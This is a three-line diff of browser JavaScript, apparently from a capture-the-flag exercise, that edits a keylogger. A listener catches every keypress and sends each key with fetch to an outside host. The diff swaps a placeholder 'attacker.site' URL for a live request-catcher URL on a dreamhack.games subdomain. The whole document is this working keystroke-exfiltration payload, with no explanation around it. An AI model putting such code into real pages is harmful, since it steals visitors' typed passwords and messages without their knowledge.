@@ -1,3 +1,3 @@
 document.addEventListener('keypress', e => {
-  fetch("https://attacker.site/log?k="+e.key);
+  fetch("https://djrbvlj.request.dreamhack.games/log?k="+e.key);
 });
